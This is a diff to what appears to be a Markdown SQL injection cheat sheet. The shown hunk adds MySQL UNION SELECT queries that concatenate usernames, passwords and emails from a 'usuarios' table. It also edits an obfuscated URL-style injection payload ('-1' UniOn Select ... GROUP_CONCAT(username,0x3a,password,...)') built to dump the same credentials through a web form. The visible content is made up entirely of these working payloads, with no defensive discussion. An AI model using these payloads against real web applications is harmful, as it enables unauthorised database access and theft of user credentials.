@@ -92,12 +92,16 @@ SELECT column_name FROM information_schema.columns WHERE table_name='usuarios' a
 
 - `MySQL` Query:
 ````sql
+select * from usuarios union select 1,2,3,4,5,6,7,8,9;
+
+select * from usuarios union select 1,2,3,GROUP_CONCAT(username,password,email),5,6,7,8,9;
+
 SELECT GROUP_CONCAT(username,password,mail,' ::: ') FROM usuarios;
 ````
 
 - `SQLi`: Web + Offuscation
 ````py
--1' UniOn Select 1,2,3,(SELECT+GROUP_CONCAT(username,0x3a,password,0x3a,mail+SEPARATOR+0x3c62723e)+FROM+usuarios),5,6
+-1' UniOn Select 1,2,3,(SELECT+GROUP_CONCAT(username,0x3a,password,0x3a,Email+SEPARATOR+0x3c62723e)+FROM+usuarios),5,6
 ````
 
 #### 1-Shot
